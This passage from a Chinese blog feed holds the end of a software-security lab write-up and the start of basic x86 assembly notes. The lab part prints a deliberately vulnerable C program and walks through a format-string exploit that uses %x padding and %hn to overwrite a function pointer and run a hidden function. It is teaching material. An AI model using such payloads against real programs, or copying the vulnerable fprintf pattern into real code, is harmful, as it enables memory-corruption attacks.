<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924779062.png" alt="1565924779062"></p>
</li>
</ol>
<h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        当程序使用的格式字符串由用户或其他非信任来源提供时，有可能出现格式字符串漏洞。攻击者可利用格式化输出函数来检查内存的内容、覆写内存。对一个数据结构进行越界写时可能会导致缓冲区溢出，可以利用缓冲区溢出来执行<code>shellcode</code>。</p>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>破解<code>foo.exe</code>程序，在不改变源代码的情况下，要求通过设置程序调用参数的方式调用该程序中隐藏的<code>foo</code>函数（主要利用<code>%n</code>及<code>%x</code>参数）。</p>
<ol>
<li><p>打开源程序分析源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*ErrFunc)</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">GhastlyError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Unrecoverable error! - err = %d\n&quot;</span>, err);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//This is, in general, a bad practice.</span></span><br><span class="line">	<span class="comment">//Exits buried deep in the X Window libraries once cost</span></span><br><span class="line">	<span class="comment">//me over a week of debugging effort.</span></span><br><span class="line">	<span class="comment">//All application exits should occur in main, ideally in one place.</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ve been hacked!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RecoverableError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Something went wrong, but you can fix it - err = %d\n&quot;</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintMessage</span><span class="params">(<span class="type">char</span>* file, <span class="type">unsigned</span> <span class="type">long</span> err)</span></span><br><span class="line">&#123;</span><br><span class="line">	ErrFunc fErrFunc;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(err == <span class="number">5</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//access denied</span></span><br><span class="line">		fErrFunc = GhastlyError;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		fErrFunc = RecoverableError;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_snprintf(buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="string">&quot;Can&#x27;tFind%s&quot;</span>, file);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//just to show you what is in the buffer</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">	<span class="comment">//just in case your compiler changes things on you</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAddress of fErrFunc is %p\n&quot;</span>, &amp;fErrFunc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Here&#x27;s where the damage is done!</span></span><br><span class="line">	<span class="comment">//Don&#x27;t do this in your code.</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, buf);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCalling ErrFunc %p\n&quot;</span>, fErrFunc);</span><br><span class="line">	fErrFunc(err);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">int</span> iTmp = <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%.300x%hn&quot;</span>,<span class="number">11</span>, &amp;iTmp);</span><br><span class="line">	FILE* pFile;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//a little cheating to make the example easy</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Address of foo is %p\n&quot;</span>, foo);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this will only open existing files</span></span><br><span class="line">	pFile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pFile == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//PrintMessage(argv[1], errno);</span></span><br><span class="line">		PrintMessage(argv[<span class="number">1</span>], errno);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Opened %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">		fclose(pFile);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源代码包含多个函数：其中<code>foo()</code>是需要执行的隐藏函数，其他函数为错误处理函数，下面重点分析<code>main()</code>函数</p>
<ul>
<li><p><code>main()</code>函数会输出一些栈的信息，包括<code>foo()</code>函数的地址</p>
</li>
<li><p>判断文件是否存在</p>
<ul>
<li>如果存在，则提示文件已经打开</li>
<li>如果不存在，调用<code>PrintMessgae()</code>输出错误信息<ul>
<li><code>err=5</code>，调用<code>GhastlyError()</code>提示错误不可修复</li>
<li><code>err≠5</code>，调用<code>RecoverableError()</code>提示错误可修复</li>
<li>输出其它错误信息</li>
</ul>
</li>
</ul>
</li>
<li><p><code>main()</code>函数的整体结构如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923636510.png" alt="1565923636510"></p>
</li>
</ul>
</li>
<li><p>分析：若想调用<code>foo</code>函数，可以通过<code>%n</code>把<code>fErrFunc</code>函数指针的地址改为<code>foo</code>函数的地址。命令行参数为<code>%x%x…%x%x%n+fErrFunc函数指针的地址</code>。<code>Buf</code>为<code>Can’tfind%x%x…%x%x%n+fErrFunc函数指针的地址</code>，由于<code>fprinf</code>中缺少参数，所以已打出的字符总数通过<code>%n</code>被写入<code>fErrFunc</code>函数指针的地址。通过控制<code>%x</code>调整字符总数以达到目的。</p>
</li>
<li><p>尝试传递一串参数 <code>%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x</code>得到，<code>fErrFunc</code>地址是<code>0x0012FF18</code>，目标函数<code>foo</code>函数地址为<code>0x00401014</code>，所以只要把<code>0x0012ff18</code>内存储的<code>0x00401005</code>更改为<code>0x00401014</code>即可</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923737593.png" alt="1565923737593"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923745441.png" alt="1565923745441"></p>
</li>
<li><p>在参数<code>%x</code>后输入字符串<code>bupt</code>，得到结果如下，与上述相比多了字符串<code>bupt</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923770857.png" alt="1565923770857"></p>
</li>
<li><p>需要把<code>0x0012ff18</code>放在一个可写位置，在前面加上<code>. . . . . . .</code>来调整<code>%x</code>输出的内容，结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923807357.png" alt="1565923807357"></p>
</li>
<li><p><code>%p</code>改成<code>%hn</code>，减少一个<code>.</code>，后面加上<code>fErrFunc</code>的地址<code>\x18\xFF\x12</code>，可以看到<code>ErrcFunc</code>已被更改为<code>0x0040017E</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923848164.png" alt="1565923848164"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923855140.png" alt="1565923855140"></p>
</li>
<li><p><code>0x0040017E</code>与<code>0x00401014</code>相差<code>3734</code>个字节，第一个<code>%x</code>打印了<code>6</code>个字节，删掉的四个 <code>.</code> 相当于少打印了<code>4</code>个字节，所以要把这<code>10</code>个字节加回去。所以参数里加上<code>%3744x</code>。更改参数后程序成功执行<code>foo</code>函数，显示<code>I’ve been hacked!!!</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923921328.png" alt="1565923921328"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923927212.png" alt="1565923927212"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>格式化输出</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言基础学习</title>
    <url>/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录汇编语言的基础知识。<span id="more"></span></p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>又叫作数据寄存器，用于存放一般性的数据，例如操作数和运算结果，通常有四个：</p>
<ul>
<li>  64位：RAX、RBX、RCX、RDX</li>
<li>  32位：EAX、EBX、ECX、EDX</li>
<li>  16位：AX、BX、CX、DX</li>
</ul>
<p>其中四个通用寄存器的一般作用如下</p>
<ul>
<li>  AX：累加寄存器，常用于运算；</li>
<li>  BX：基址寄存器，常用于地址索引；</li>
<li>  CX：计数寄存器，常用于计数；</li>
<li>  DX：数据寄存器，常用于数据传递；</li>
</ul>
<h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>主要用于存放存储单元在段内的偏移量，有两个：</p>
<ul>
<li>  64位：RSI、RDI</li>
<li>  32位：ESI、EDI</li>
<li>  16位：SI、DI</li>
</ul>
<p>SI（Source Index）：源变址寄存器，可用来存放相对于DS段的源变址指针； </p>
<p>DI（Destination Index）：目的变址寄存器，可用来存放相对于ES段的目的变址指针；</p>
<p>SI、DI不能够分成两个8位寄存器来使用；</p>
<h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>主要用于存放堆栈内存储单元的偏移量 ，用它们可实现多种存储器操作数的寻址方式，有两个：</p>
<ul>
<li><p>  64位：RBP、RSP</p>
</li>
<li><p>  32位：EBP、ESP</p>
</li>
<li><p>  16位：BP、SP</p>
</li>
</ul>
<p>BP为基指针(BasePointer)寄存器，用它可直接存取堆栈中的数据；</p>
<p>SP为堆栈指针(StackPointer)寄存器，用它只可访问栈顶，存储栈顶的偏移地址，SS:SP指向栈顶；</p>
<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><ul>
<li><p>  段寄存器是根据内存分段的管理模式而设置的；</p>
</li>
<li><p>  内存单元的物理地址由段寄存器的值和一个偏移量值组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址；</p>
</li>
</ul>
<p>段寄存器包括：</p>
<ul>
<li><p>  CS代码段寄存器(CodeSegmentRegister)，其值为代码段的地址</p>
</li>
<li><p>  DS数据段寄存器(DataSegmentRegister)，其值为数据段的地址</p>
</li>
<li><p>  SS堆栈段寄存器(StackSegmentRegister)，其值为堆栈段的段地址</p>
</li>
<li><p>  ES附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的地址</p>
</li>
<li><p>  FS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的地址</p>
</li>
<li><p>  GS附加段寄存器(ExtraSegmentRegister)，其值为附加数据段的地址</p>
</li>
</ul>
<h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>存放下次将要执行的指令在代码段的偏移量，配合CS寄存器一起使用CS:IP，只有一个：</p>
<ul>
<li>  64位：RIP</li>
<li>  32位：EIP</li>
<li>  16位：IP</li>
</ul>
<h3 id="标志寄存器-flag"><a href="#标志寄存器-flag" class="headerlink" title="标志寄存器(flag)"></a>标志寄存器(flag)</h3><ul>
<li><p>标志寄存器的作用：</p>
<ol>
<li> 用来存储相关指令的某些执行结果；</li>
<li> 用来为CPU执行相关指令提供行为依据；</li>
<li> 用来控制CPU的相关工作方式；</li>
</ol>
</li>
<li><p>flag寄存器按位起作用，每一位都有专门的含义</p>
<p>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/p2T0oAQ.png"></p>
</li>
</ul>
<h4 id="ZF标志位"><a href="#ZF标志位" class="headerlink" title="ZF标志位"></a>ZF标志位</h4><ul>
<li><p>  第6位，零标志位；</p>
</li>
<li><p>它记录相关指令执行后，其结果是否为0：</p>
<ul>
<li>  如果结果为0，那么zf=1</li>
<li>  如果结果不为0，那么zf=0</li>
</ul>
</li>
<li><p>例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br><span class="line">; 执行后结果为0，zf=1</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="PF标志位"><a href="#PF标志位" class="headerlink" title="PF标志位"></a>PF标志位</h4><ul>
<li><p>  第2位，奇偶标志位；</p>
</li>
<li><p>它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数：</p>
<ul>
<li>  如果1的个数为偶数，pf=1；</li>
<li>  如果为奇数，那么pf=0；</li>
</ul>
</li>
<li><p>例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add al,10</span><br><span class="line">; 执行后，结果为00001011B，其中有3个1，则pf=0</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="SF标志位"><a href="#SF标志位" class="headerlink" title="SF标志位"></a>SF标志位</h4><ul>
<li><p>  第7位，符号标志位；</p>
</li>
<li><p>它记录相关指令后，其结果是否为负：</p>
<ul>
<li>  如果结果为负，sf=1；</li>
<li>  如果不为负，sf=0；</li>
</ul>
</li>
<li><p>计算机通常用补码来表示有符号数据。计算机中的一个数据可以看做是有符号数，也可以看做成无符号数。</p>
<p>  比如：<br>  00000001B，可以看做无符号数1，或有符号数+1；<br>  10000001B，可以看做无符号数129，也可以看作有符号数-127；<br>  不管我们如何看待，CPU在执行add等指令的时候，就已经包含了两种含义，也将得到同一种信息来记录的两种结果。关键在于程序需要哪一种结果；</p>
</li>
<li><p>例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br><span class="line">; 执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；</span><br><span class="line">mov al,100000001B</span><br><span class="line">add al,011111111B</span><br><span class="line">; 执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负；</span><br></pre></td></tr></table></figure></li>
<li><p>  某些指令将影响寄存器中的多个标记位，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令<code>sub al,al</code>执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0；</p>
</li>
</ul>
<h4 id="CF标志位"><a href="#CF标志位" class="headerlink" title="CF标志位"></a>CF标志位</h4><ul>
<li><p>  第0位，进位标志位；</p>
</li>
<li><p>  一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位；</p>
</li>
<li><p>例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 进位</span><br><span class="line">mov al,98H</span><br><span class="line">add al,al		; 执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值</span><br><span class="line">add al,al		; 执行后：（al）=60H，CF=0</span><br><span class="line">; 借位</span><br><span class="line">mov al,97H</span><br><span class="line">sub al,98H	; 执行后（al）=FFH，CF=1，CF记录了向更高位的借位值</span><br><span class="line">sub al,al		; 执行后（al）=0，CF=0，CF记录了向更高位借位值</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="OF标志位"><a href="#OF标志位" class="headerlink" title="OF标志位"></a>OF标志位</h4><ul>
<li><p>  第11位，溢出标志位；</p>
</li>
<li><p>一般情况下，OF记录了有符号数运算的结果是否发生了溢出：</p>
<ul>
<li>  如果发生溢出，OF=1；</li>
<li>  如果没有，OF=0；</li>
</ul>
</li>
<li><p>例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,F0H</span><br><span class="line">add al,88H</span><br><span class="line">; 执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；</span><br><span class="line">; 对于有符号数运算，F0H+78H不发生溢出，OF=0</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="AF标志位"><a href="#AF标志位" class="headerlink" title="AF标志位"></a>AF标志位</h4><ul>
<li>  第四位，辅助标志位；</li>
<li>  反应运算结果低四位产生进位或错位的情况；</li>
</ul>
<h4 id="DF标志位"><a href="#DF标志位" class="headerlink" title="DF标志位"></a>DF标志位</h4><ul>
<li>  第10位，方向标志位；</li>
<li>在串处理指令中，控制每次操作后si，di的增减：<ul>
<li>  df=0，每次操作后si、di递增；</li>
<li>  df=1，每次操作后si、di递减；</li>
</ul>
</li>
</ul>
<h4 id="TF标志位"><a href="#TF标志位" class="headerlink" title="TF标志位"></a>TF标志位</h4><ul>
<li>  第8位，单步标志位；</li>
<li>用于程序跟踪调试：<ul>
<li>  当TF=1，CPU进入单步方式；</li>
</ul>
</li>
</ul>
<h4 id="IF标志位"><a href="#IF标志位" class="headerlink" title="IF标志位"></a>IF标志位</h4><ul>
<li>第9位，中断允许位<ul>
<li>  当IF=1时，CPU为开中断；</li>
<li>  当IF=0时，CPU为关中断；</li>
</ul>
</li>
</ul>
<h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><p>操作数包含在指令中，它作为指令的一部分，跟在操作码后存放在代码段；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,idata</span><br><span class="line"># example</span><br><span class="line">mov ax,1234h</span><br></pre></td></tr></table></figure>

<h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><p>指令所要的操作数已存储在某寄存器中，直接对寄存器进行操作；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 寄存器1,寄存器2</span><br><span class="line"># example</span><br><span class="line">mov si,ax</span><br></pre></td></tr></table></figure>

<h3 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h3><p>操作数在存储器中，指令直接包含有操作数的有效地址；</p>
<p>由于操作数一般存放在数据段，所以操作数的地址由DS加上指令中给出的16位偏移得到；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 寄存器,[idata]</span><br><span class="line">EA = idata	# 偏移地址</span><br><span class="line">SA = (ds)		# 段地址</span><br><span class="line"># example</span><br><span class="line">mov ax,[1234h]	# 假设DS内容是50000H，地址为51234H字存储单元中的内容时6789H，那么在执行“MOV AX, [1234H]”后寄存器AX的内容是6789H</span><br></pre></td></tr></table></figure>

<h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><p>操作数在存储器中，操作数有效地址在SI、DI、BX、BP这四个寄存器之一中；</p>
<p>在一般情况下：</p>
<ul>
<li>  如果有效地址在SI、DI和BX中，则以DS段寄存器的内容为段值；</li>
<li>  如果有效地址在BP中，则以SS段寄存器的内容为段值；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bx]</span><br><span class="line">    EA = (bx)</span><br><span class="line">    SA = (ds)</span><br><span class="line">[si]</span><br><span class="line">		EA = (si)</span><br><span class="line">		SA = (ds)</span><br><span class="line">[di]</span><br><span class="line">		EA = (di)</span><br><span class="line">		SA = (ds)</span><br><span class="line">[bp]</span><br><span class="line">		EA = (bp)</span><br><span class="line">		SA = (ss)</span><br><span class="line"># example</span><br><span class="line">MOV ax,[si]	#自动引用DS作为段寄存器，假设（DS）= 50000H,（SI）= 1234H，那么存储的物理存储单元地址是51234H，再假设该字存储单元的内容是6789H，那么在执行该指令后,（AX）= 6789H</span><br></pre></td></tr></table></figure>

<h3 id="寄存器相对寻址"><a href="#寄存器相对寻址" class="headerlink" title="寄存器相对寻址"></a>寄存器相对寻址</h3><p>操作数在存储器中，操作数的有效地址是一个基址寄存器（BX、BP）或变址寄存器的（SI、DI）内容加上指令中给定的8位或16位偏移量之和；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bx+idata]</span><br><span class="line">    EA = (bx)+idata</span><br><span class="line">    SA = (ds)</span><br><span class="line">[si+idata]</span><br><span class="line">	EA = (si)+idata</span><br><span class="line">	SA = (ds)</span><br><span class="line">[di+idata]</span><br><span class="line">	EA = (di)+idata</span><br><span class="line">	SA = (ds)</span><br><span class="line">[bp+idata]</span><br><span class="line">	EA = (bp)+idata</span><br><span class="line">	SA = (ss)</span><br><span class="line"># example</span><br><span class="line">MOV ax, [di+1223h]	#自动引用DS作为段寄存器，假设（DS）= 50000H，（DI）= 3678H，那么，存储的物理存储单元地址是5489BH，再假设该字存储单元的内容是55AAH，那么在执行该指令后,（AX）= 55AAH</span><br></pre></td></tr></table></figure>

<h3 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h3><p>操作数在存储器中，操作数的有效地址由基址寄存器之一的内容与变址寄存器之一的内容相加得到；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bx+si]</span><br><span class="line">    EA = (bx+si)</span><br><span class="line">    SA = (ds)</span><br><span class="line">[bx+di]</span><br><span class="line">	EA = (bx+di)</span><br><span class="line">	SA = (ds)</span><br><span class="line">[bp+si]</span><br><span class="line">	EA = (bp+si)</span><br><span class="line">	SA = (ss)</span><br><span class="line">[bp+di]</span><br><span class="line">	EA = (bp+di)</span><br><span class="line">	SA = (ss)</span><br><span class="line"># example</span><br><span class="line">MOV ax,[bp+di]		# 自动引用SS作为段寄存器，假设（SS）= 50000H，（BP）= 1223H， （DI）= 54H，那么，存储的物理存储单元地址是51277H，再假设改字存储单元的内容是168H，那么在执行该指令后，（AX）= 168H</span><br></pre></td></tr></table></figure>

<h3 id="相对基址变址寻址"><a href="#相对基址变址寻址" class="headerlink" title="相对基址变址寻址"></a>相对基址变址寻址</h3><p>操作数在存储器中，操作数的有效地址由基址寄存器之一的内容与变址寄存器之一的内容及指令中给定的偏移量相加得到；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bx+si+idata]</span><br><span class="line">    EA = (bx+si)+idata</span><br><span class="line">    SA = (ds)</span><br><span class="line">[bx+di+idata]</span><br><span class="line">	EA = (bx+di)+idata</span><br><span class="line">	SA = (ds)</span><br><span class="line">[bp+si+idata]</span><br><span class="line">	EA = (bp+si)+idata</span><br><span class="line">	SA = (ss)</span><br><span class="line">[bp+di+idata]</span><br><span class="line">	EA = (bp+di)+idata</span><br><span class="line">	SA = (ss)</span><br><span class="line"># example</span><br><span class="line">MOV ax, [bx+di-2] 	# 自动引用DS作为段寄存器，假设，（DS）= 50000H，（BX）= 1223H, （DI）= 54H，那么，存取的物理存储单元地址是51275H，再设该字存储单元的内容是7654H，那么在执行该指令后，（AX）= 7654H</span><br><span class="line"># 以下四种表示方法均是等价的</span><br><span class="line">MOV AX,[BX+DI+1234H]</span><br><span class="line">MOV AX,1234H[BX+DI]</span><br><span class="line">MOV AX,1234H[BX][DI]</span><br><span class="line">MOV AX,1234H[DI][BX]</span><br></pre></td></tr></table></figure>

<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="CPU指令执行过程"><a href="#CPU指令执行过程" class="headerlink" title="CPU指令执行过程"></a>CPU指令执行过程</h3><ol>
<li> 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲区；</li>
<li> (IP) = (IP)+所读取指令的长度（8位地址，因为范围是-128~127），从而指向下一条指令；</li>
<li> 执行指令；</li>
<li> 转到步骤1，重复这个过程；</li>
</ol>
<h3 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a><code>mov</code>指令</h3><p>MOV指令可以在CPU内或CPU和存储器之间传送字或字节；</p>
<p>它传送的信息可以从</p>
<ul>
<li>  寄存器到寄存器，<code>mov ax,bx</code></li>
<li>  立即数到寄存器，<code>mov ax,8</code></li>
<li>  立即数到存储单元，<code>mov [0],8</code></li>
<li>  从存储单元到寄存器，<code>mov ax,[0]</code></li>
<li>  从寄存器到存储单元，<code>mov [0],ax</code></li>
<li>  从寄存器或存储单元到除CS外的段寄存器 (<strong>注意立即数不能直接送段寄存器</strong>)，<code>mov ds,ax</code>、<code>mov ds,[0]</code></li>
<li>  从段寄存器到寄存器或存储单元，<code>mov ax,ds</code>、<code>mov [0],ds</code></li>
</ul>
<p><strong>注意</strong>：</p>
<ul>
<li>  MOV指令中的源操作数绝对不能是立即数和代码段CS寄存器；</li>
<li>  MOV指令中绝对不允许在两个存储单元之间直接传送数据；</li>
<li>  MOV指令中绝对不允许在两个段寄存器之间直接传送数据；</li>
<li>  MOV指令不会影响标志位；</li>
</ul>
<h3 id="add指令"><a href="#add指令" class="headerlink" title="add指令"></a><code>add</code>指令</h3><p>用于实现数据加法运算，操作和要求与<code>mov</code>相同；</p>
<h3 id="sub指令"><a href="#sub指令" class="headerlink" title="sub指令"></a><code>sub</code>指令</h3><p>用于实现数据减法运算，操作和要求与<code>mov</code>相同；</p>
<h3 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a><code>div</code>指令</h3><p>div是除法指令，使用div做除法的时候应注意以下问题：</p>
<ol>
<li><p> 除数：有8位和16位两种，在一个寄存器或者内存中。</p>
</li>
<li><p> 被除数：默认放在AX或（DX和AX）中，如果除数为8位，被除数为16位，被除数默认在AX中存放，如果除数为16位，被除数为32位，被除数则在（DX和AX）中存放，DX存放高16位，AX存放低16位。</p>
</li>
<li><p>结果：如果除数是8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数是16位，则AX存储除法操作的商，DX存储除法操作的余数。</p>
<table>
<thead>
<tr>
<th>被除数</th>
<th>除数</th>
<th>商</th>
<th>余数</th>
</tr>
</thead>
<tbody><tr>
<td>AX</td>
<td>reg/mem8</td>
<td>AL</td>
<td>AH</td>
</tr>
<tr>
<td>DX:AX</td>
<td>reg/mem16</td>
<td>AX</td>
<td>DX</td>
</tr>
<tr>
<td>EDX:EAX</td>
<td>reg/mem32</td>
<td>EAX</td>
<td>EDX</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 8位无符号除法</span><br><span class="line">mov ax, 0083h		; 被除数</span><br><span class="line">mov bl, 2			; 除数</span><br><span class="line">div bl				; AL = 41h, AH = Olh</span><br><span class="line">; 16位无符号除法</span><br><span class="line">mov dx, 0			; 清除被除数高16位</span><br><span class="line">mov ax, 8003h		; 被除数的低16位</span><br><span class="line">mov ex, 100h		; 除数</span><br><span class="line">div ex				; AX = 0080h, DX = 0003h</span><br></pre></td></tr></table></figure></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a><code>mul</code>指令</h3><ul>
<li><p>  mul 是乘法指令；</p>
</li>
<li><p>两个相乘的数：两个相乘的数，要么都是 8 位，要么都是 16 位；</p>
<ul>
<li>  如果是 8 位，一个默认放在 AL 中，另一个放在 8 位寄存器或内存字节单元中；</li>
<li>  如果是 16 位，一个默认在 AX 中，另一个放在 16 位寄存器或内存字单元中；</li>
</ul>
</li>
<li><p>  结果：如果是 8 位乘法，结果默认放在 AX 中；如果是 16 位乘法，结果高位默认在 DX 中存放，低位在 AX 中存放；</p>
</li>
<li><p>格式：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br></pre></td></tr></table></figure></li>
<li><p>内存单元可以用不同的寻址方式给出</p>
